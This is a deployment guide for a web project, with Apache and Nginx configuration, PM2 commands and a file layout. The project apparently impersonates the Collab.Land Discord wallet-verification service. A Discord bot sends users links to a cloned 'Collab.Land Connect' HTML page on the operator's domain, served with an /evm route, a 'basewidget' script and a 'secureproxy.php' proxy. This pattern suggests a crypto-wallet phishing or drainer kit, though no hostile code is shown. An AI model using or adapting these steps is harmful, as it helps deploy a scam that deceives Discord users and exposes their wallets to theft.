# VPS Deployment Guide

This guide will help you deploy this project to your VPS with PHP support.

## Prerequisites

- VPS with Node.js (v18+) and PHP installed
- Web server (Apache or Nginx)
- PM2 (recommended for process management)

## Installation Steps

### 1. Install Dependencies

```bash
npm install
```

### 2. Configure Environment Variables

Create a `.env` file:

```env
DISCORD_BOT_TOKEN=your_bot_token_here
HTML_BASE_URL=https://yourdomain.com
PORT=3000
```

### 3. Set Up Web Server Configuration

#### Option A: Apache Configuration

Create or edit your Apache virtual host configuration:

```apache
<VirtualHost *:80>
    ServerName yourdomain.com
    
    # Serve PHP files directly
    <FilesMatch \.php$>
        SetHandler application/x-httpd-php
    </FilesMatch>
    
    # Proxy Node.js server requests to /evm
    ProxyPreserveHost On
    ProxyPass /evm http://localhost:3000/evm
    ProxyPassReverse /evm http://localhost:3000/evm
    
    # Serve static JS files from Node.js
    ProxyPass /basewidget-4.7.3.js http://localhost:3000/basewidget-4.7.3.js
    ProxyPassReverse /basewidget-4.7.3.js http://localhost:3000/basewidget-4.7.3.js
    
    # Serve PHP files directly (like secureproxy.php)
    DocumentRoot /path/to/your/project
    
    <Directory /path/to/your/project>
        Options Indexes FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>
</VirtualHost>
```

#### Option B: Nginx Configuration

Create or edit your Nginx server configuration:

```nginx
server {
    listen 80;
    server_name yourdomain.com;
    root /path/to/your/project;
    index index.php index.html;

    # Serve PHP files
    location ~ \.php$ {
        fastcgi_pass unix:/var/run/php/php8.1-fpm.sock;  # Adjust PHP version
        fastcgi_index index.php;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
        include fastcgi_params;
    }

    # Proxy Node.js server for /evm route
    location /evm {
        proxy_pass http://localhost:3000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_cache_bypass $http_upgrade;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }

    # Proxy static JS files
    location ~ \.js$ {
        proxy_pass http://localhost:3000;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }

    # Serve other static files
    location / {
        try_files $uri $uri/ =404;
    }
}
```

### 4. Start Node.js Server with PM2

Install PM2 globally (if not already installed):

```bash
npm install -g pm2
```

Start the server:

```bash
pm2 start server.js --name collab-land-server
```

Save PM2 configuration:

```bash
pm2 save
pm2 startup
```

### 5. Start Discord Bot with PM2

```bash
pm2 start bot.js --name collab-land-bot
pm2 save
```

### 6. Monitor Services

View logs:

```bash
pm2 logs
```

View status:

```bash
pm2 status
```

### 7. Restart Web Server

**Apache:**
```bash
sudo systemctl restart apache2
```

**Nginx:**
```bash
sudo systemctl restart nginx
```

## File Structure

```
your-project/
├── bot.js                          # Discord bot
├── server.js                       # Node.js web server
├── secureproxy.php                 # PHP proxy (served by web server)
├── basewidget-4.7.3.js            # JavaScript file (served by Node.js)
├── Collab.Land Connect (...).html # HTML template
├── package.json
├── .env
└── ...
```

## How It Works

1. **PHP Files** (`secureproxy.php`) are served directly by Apache/Nginx with PHP support
2. **Node.js Server** (`server.js`) handles:
   - `/evm` route - serves the HTML file with personalized content
   - `*.js` files - serves static JavaScript files
3. **Discord Bot** (`bot.js`) runs separately and generates URLs pointing to your server

## Troubleshooting

### Port Already in Use

If port 3000 is already in use, change it in `server.js`:

```javascript
const PORT = process.env.PORT || 3001;
```

And update your web server configuration accordingly.

### PHP Not Working

Make sure PHP is installed and the PHP handler is configured correctly in your web server.

### Node.js Server Not Starting

Check logs:

```bash
pm2 logs collab-land-server
```

### Static Files Not Loading

Make sure your web server is configured to proxy requests for `.js` files to the Node.js server, or serve them directly from the file system.

## Security Notes

- Keep your `.env` file secure and never commit it to version control
- Use HTTPS in production (set up SSL certificates)
- Consider using a reverse proxy like Cloudflare
- Keep your dependencies updated

## Updating

To update the server:

```bash
git pull
npm install
pm2 restart collab-land-server
pm2 restart collab-land-bot
```

